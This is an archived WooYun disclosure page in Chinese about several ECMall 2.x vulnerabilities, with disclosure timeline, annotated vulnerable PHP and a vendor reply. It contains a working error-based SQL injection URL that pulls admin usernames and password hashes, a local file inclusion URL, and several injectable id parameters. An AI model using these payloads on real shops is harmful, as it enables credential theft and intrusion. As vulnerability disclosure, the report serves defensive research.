@@ -1,0 +1,409 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Ecmall 2.x 多处安全漏洞汇总  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Ecmall 2.x 多处安全漏洞汇总  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2014-02-28 11:20</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-28：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-03-03：	细节向第三方安全合作伙伴开放<br/>
+									2014-03-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-20：	细节向普通白帽子公开<br/>
+									2014-04-09：	细节向实习白帽子公开<br/>
+									2014-05-29：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一处通杀注入，同文件多处鸡肋注入，一处本地包含。累了不看了，体力活。。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">通杀注入:http://localhost/ecmall/index.php?app=my_goods&amp;act=brand_list&amp;order=asc&amp;sort=1 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)%23<br />
+<br />
+<br />
+<br />
+app/my_goods.app.php<br />
+<br />
+</p><pre><code>function brand_list()<br />
+    {<br />
+        $_GET[&#039;store_id&#039;] = $this-&gt;_store_id;<br />
+        $_GET[&#039;if_show&#039;] = BRAND_PASSED;<br />
+        $con = array(<br />
+            array(<br />
+                &#039;field&#039; =&gt; &#039;store_id&#039;,<br />
+                &#039;name&#039;  =&gt; &#039;store_id&#039;,<br />
+                &#039;equal&#039; =&gt; &#039;=&#039;,<br />
+            ),<br />
+            array(<br />
+                &#039;field&#039; =&gt; &#039;if_show&#039;,<br />
+                &#039;name&#039;  =&gt; &#039;if_show&#039;,<br />
+                &#039;equal&#039; =&gt; &#039;=&#039;,<br />
+                &#039;assoc&#039; =&gt; &#039;or&#039;,<br />
+            ),);<br />
+        $filtered = &#039;&#039;;<br />
+        if (!empty($_GET[&#039;brand_name&#039;]) || !empty($_GET[&#039;store&#039;]))<br />
+        {<br />
+            $_GET[&#039;brand_name&#039;] &amp;&amp; $filtered = &quot; AND brand_name LIKE &#039;%{$_GET[&#039;brand_name&#039;]}%&#039;&quot;;<br />
+            $_GET[&#039;store&#039;] &amp;&amp; $filtered = $filtered . &quot; AND store_id = &quot; . $this-&gt;_store_id;<br />
+        }<br />
+        if (isset($_GET[&#039;sort&#039;]) &amp;&amp; isset($_GET[&#039;order&#039;])) <br />
+        {<br />
+            $sort  = strtolower(trim($_GET[&#039;sort&#039;]));<br />
+            $order = strtolower(trim($_GET[&#039;order&#039;])); <br />
+            if (!in_array($order,array(&#039;asc&#039;,&#039;desc&#039;))) //依然只过滤了order,没有过滤sort<br />
+            {<br />
+                $sort  = &#039;store_id&#039;;<br />
+                $order = &#039;desc&#039;;<br />
+            }<br />
+        }<br />
+        else<br />
+        {<br />
+            $sort  = &#039;store_id&#039;;<br />
+            $order = &#039;desc&#039;;<br />
+        }<br />
+        $page = $this-&gt;_get_page(10);<br />
+        $conditions = $this-&gt;_get_query_conditions($con);<br />
+        $brand = $this-&gt;_brand_mod-&gt;find(array(<br />
+            &#039;conditions&#039; =&gt; &quot;(1=1 $conditions)&quot; . $filtered,<br />
+            &#039;limit&#039; =&gt; $page[&#039;limit&#039;],<br />
+            &#039;order&#039; =&gt; &quot;$sort $order&quot;, //带入查询 order by参数注入.<br />
+            &#039;count&#039; =&gt; true,<br />
+        ));<br />
+        $page[&#039;item_count&#039;] = $this-&gt;_brand_mod-&gt;getCount();<br />
+......<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+本地包含漏洞:http://localhost/ecmall/index.php?app=my_payment&amp;act=install&amp;code=wooyun<br />
+<br />
+<br />
+<br />
+app/my_payment.app.php<br />
+<br />
+</p><pre><code>function install()<br />
+    {<br />
+        $code = isset($_GET[&#039;code&#039;]) ? trim($_GET[&#039;code&#039;]) : 0; //没过滤<br />
+        if (!$code)<br />
+        {<br />
+            echo Lang::get(&#039;no_such_payment&#039;);<br />
+<br />
+            return;<br />
+        }<br />
+        $model_payment =&amp; m(&#039;payment&#039;);<br />
+        $payment       = $model_payment-&gt;get_builtin_info($code); //跟进<br />
+        if (!$payment)<br />
+        {<br />
+            echo Lang::get(&#039;no_such_payment&#039;);<br />
+<br />
+            return;<br />
+        }<br />
+        $payment_info = $model_payment-&gt;get(&quot;store_id=&quot; . $this-&gt;visitor-&gt;get(&#039;manage_store&#039;) . &quot; AND payment_code=&#039;{$code}&#039;&quot;);<br />
+        if (!empty($payment_info))<br />
+        {<br />
+            echo Lang::get(&#039;already_installed&#039;);<br />
+<br />
+            return;<br />
+        }<br />
+...... <br />
+}<br />
+includes/models/paymet.model.php<br />
+&lt;code&gt;<br />
+    function get_builtin_info($code)<br />
+    {<br />
+        Lang::load(lang_file(&#039;payment/&#039; . $code));<br />
+        $payment_path = ROOT_PATH . &#039;/includes/payments/&#039; . $code . &#039;/payment.info.php&#039;;<br />
+<br />
+        return include($payment_path); //包含之.<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+鸡肋注入:http://localhost/ecmall/index.php?app=seller_groupbuy&amp;act=edit&amp;id=1&#039;<br />
+<br />
+http://localhost/ecmall/index.php?app=seller_groupbuy&amp;act=xxxxxxxx&amp;id=1&#039;<br />
+<br />
+需要开启团购活动<br />
+<br />
+<br />
+<br />
+app/seller_groupbuy.app.php<br />
+<br />
+</p><pre><code>function edit()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;]; //没过滤,下面还有很多类似的<br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+        if (!$this-&gt;_ican($id, ACT)) //带入查询<br />
+        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+       ......<br />
+    }<br />
+<br />
+    function drop()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;]; //下同<br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+        if (!$this-&gt;_ican($id, ACT)) //下同<br />
+        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+......<br />
+    }<br />
+<br />
+    function start()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;];<br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+        if (!$this-&gt;_ican($id, ACT))<br />
+        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+       ......<br />
+    }<br />
+<br />
+    function finished()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;];<br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+        if (!$this-&gt;_ican($id, ACT))<br />
+        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+        /* 团购信息 */<br />
+        $group = $this-&gt;_groupbuy_mod-&gt;get(array(<br />
+            &#039;conditions&#039; =&gt; &#039;group_id=&#039; . $id, //同样带入查询<br />
+            &#039;fields&#039;     =&gt; &#039;group_name&#039;,<br />
+        ));<br />
+......<br />
+    }<br />
+<br />
+    function desc()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;];<br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+        if (!$this-&gt;_ican($id, ACT))<br />
+        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+ ......<br />
+            /* 团购信息 */<br />
+            $group = $this-&gt;_groupbuy_mod-&gt;get(array(<br />
+                &#039;conditions&#039; =&gt; &#039;group_id=&#039; . $id,<br />
+                &#039;fields&#039;     =&gt; &#039;group_desc&#039;,<br />
+            ));<br />
+           ......<br />
+    }<br />
+<br />
+    function cancel()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;];<br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+        if (!$this-&gt;_ican($id, ACT))<br />
+        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+        /* 团购信息 */<br />
+        $group = $this-&gt;_groupbuy_mod-&gt;get(array(<br />
+            &#039;conditions&#039; =&gt; &#039;group_id=&#039; . $id,<br />
+            &#039;fields&#039;     =&gt; &#039;group_desc,group_name,owner_name&#039;,<br />
+            &#039;join&#039;       =&gt; &#039;belong_store&#039;<br />
+        ));<br />
+<br />
+    }<br />
+<br />
+    function log()<br />
+    {<br />
+        $id = empty($_GET[&#039;id&#039;]) ? 0 : $_GET[&#039;id&#039;]; <br />
+        if (!$id)<br />
+        {<br />
+            $this-&gt;show_warning(&#039;no_such_groupbuy&#039;);<br />
+            return false;<br />
+        }<br />
+        if (!$this-&gt;_ican($id, ACT))        {<br />
+            $this-&gt;show_warning(&#039;Hacking Attempt&#039;);<br />
+            return;<br />
+        }<br />
+        $group = $this-&gt;_groupbuy_mod-&gt;get(array(<br />
+            &#039;conditions&#039; =&gt; &#039;group_id=&#039; . $id,<br />
+            &#039;fields&#039;     =&gt; &#039;group_desc, group_name, goods_id&#039;,<br />
+        ));<br />
+    }</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/28234646dde0a3b438bd0f4df0565ce02a521a5a.jpg" target="_blank"><img src="../images/28234646dde0a3b438bd0f4df0565ce02a521a5a.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/282346331e2ba656603096958b192e953fd71f08.jpg" target="_blank"><img src="../images/282346331e2ba656603096958b192e953fd71f08.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/28234623c8f9c2548fa624a8be5e380502b3f53a.jpg" target="_blank"><img src="../images/28234623c8f9c2548fa624a8be5e380502b3f53a.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/282346138784b3e845799bb68e28243e590238d4.jpg" target="_blank"><img src="../images/282346138784b3e845799bb68e28243e590238d4.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-038492" title="Ecmall 2.x 多处安全漏洞汇总">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：2 </p>
+													<p class="detail">确认时间：2014-02-28 11:30</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+该漏洞通过其他渠道已经提交过，并在处理中<br />
+谢谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="38492";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
